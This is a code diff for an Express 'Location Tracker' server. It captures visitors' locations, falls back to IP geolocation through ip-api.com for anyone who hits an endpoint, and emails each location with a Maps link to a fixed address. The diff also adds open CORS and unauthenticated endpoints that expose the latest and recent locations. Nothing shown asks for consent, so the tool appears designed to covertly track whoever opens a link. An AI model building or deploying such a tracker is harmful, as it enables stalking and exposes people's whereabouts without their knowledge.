@@ -16,13 +16,26 @@ try {
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-app.use(cors());
+// CORS configuration - Allow all origins for Render
+app.use(cors({
+    origin: '*',
+    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
+    allowedHeaders: ['Content-Type', 'Authorization']
+}));
+
 app.use(express.json());
 app.use(express.static('public'));
 
 // Store latest location
 let latestLocation = null;
 let locationHistory = [];
+
+// Get base URL for different environments
+function getBaseUrl(req) {
+    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
+    const host = req.headers['host'] || 'localhost:3000';
+    return `${protocol}://${host}`;
+}
 
 // Email Configuration
 const transporter = nodemailer.createTransport({
@@ -53,6 +66,24 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+// Serve public files
+app.use(express.static('public'));
+
+// API endpoint to get server URL (for frontend)
+app.get('/api/config', (req, res) => {
+    const baseUrl = getBaseUrl(req);
+    res.json({
+        success: true,
+        data: {
+            baseUrl: baseUrl,
+            apiUrl: `${baseUrl}/api`,
+            isProduction: process.env.NODE_ENV === 'production',
+            renderUrl: process.env.RENDER_EXTERNAL_URL || null
+        }
+    });
+});
+
+// Get latest location
 app.get('/api/latest-location', (req, res) => {
     res.json({
         success: !!latestLocation,
@@ -60,17 +91,68 @@ app.get('/api/latest-location', (req, res) => {
     });
 });
 
+// Get location history
+app.get('/api/location-history', (req, res) => {
+    res.json({
+        success: true,
+        data: locationHistory.slice(-10)
+    });
+});
+
+// Test email endpoint
 app.get('/test-email', async (req, res) => {
     try {
         await transporter.sendMail({
             from: process.env.EMAIL_USER,
             to: process.env.EMAIL_TO,
-            subject: '✅ Test Email',
-            text: 'Email configuration working!'
+            subject: '✅ Test Email - Location Tracker',
+            text: 'Email configuration working on Render!'
         });
         res.json({ success: true, message: 'Test email sent!' });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// Get location from IP (fallback)
+app.get('/api/get-location', async (req, res) => {
+    try {
+        let clientIP = req.headers['x-forwarded-for']?.split(',')[0] || 
+                       req.connection.remoteAddress || 
+                       req.ip;
+
+        if (clientIP.startsWith('::ffff:')) {
+            clientIP = clientIP.substring(7);
+        }
+
+        console.log(`📍 Getting location for IP: ${clientIP}`);
+
+        const response = await fetch(`http://ip-api.com/json/${clientIP}?fields=status,lat,lon,city,regionName,country,query`);
+        const data = await response.json();
+
+        if (data.status === 'success') {
+            const result = {
+                ip: data.query,
+                latitude: data.lat,
+                longitude: data.lon,
+                city: data.city,
+                region: data.regionName,
+                country: data.country,
+                accuracy: 'IP-based (approx)',
+                source: 'IP Fallback',
+                googleMapsLink: `https://www.google.com/maps?q=${data.lat},${data.lon}`
+            };
+            
+            latestLocation = result;
+            locationHistory.push({ ...result, capturedAt: new Date().toISOString() });
+            
+            res.json({ success: true, data: result });
+        } else {
+            throw new Error('IP lookup failed');
+        }
+    } catch (error) {
+        console.error('IP lookup error:', error);
+        res.status(500).json({ success: false, message: error.message });
     }
 });
 
@@ -164,16 +246,34 @@ app.post('/api/track-location', async (req, res) => {
 
         console.log(`✅ Email sent to ${process.env.EMAIL_TO}`);
 
-        res.json({ success: true, message: 'Location tracked!' });
+        res.json({ 
+            success: true, 
+            message: 'Location tracked!',
+            mapsLink: mapsLink 
+        });
 
     } catch (error) {
         console.error('❌ Error:', error);
-        res.status(500).json({ success: false, message: error.message });
+        res.status(500).json({ 
+            success: false, 
+            message: error.message 
+        });
     }
 });
 
+// Health check endpoint
+app.get('/health', (req, res) => {
+    res.json({
+        status: 'ok',
+        timestamp: new Date().toISOString(),
+        uptime: process.uptime(),
+        locationCount: locationHistory.length,
+        hasLocation: !!latestLocation
+    });
+});
+
 app.listen(PORT, () => {
-    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
-    console.log(`📧 Test email: http://localhost:${PORT}/test-email`);
-    console.log(`📍 Location tracker: http://localhost:${PORT}/\n`);
+    console.log(`\n🚀 Server running on port ${PORT}`);
+    console.log(`📧 Email: ${process.env.EMAIL_USER} → ${process.env.EMAIL_TO}`);
+    console.log(`🔗 Health check: http://localhost:${PORT}/health\n`);
 });
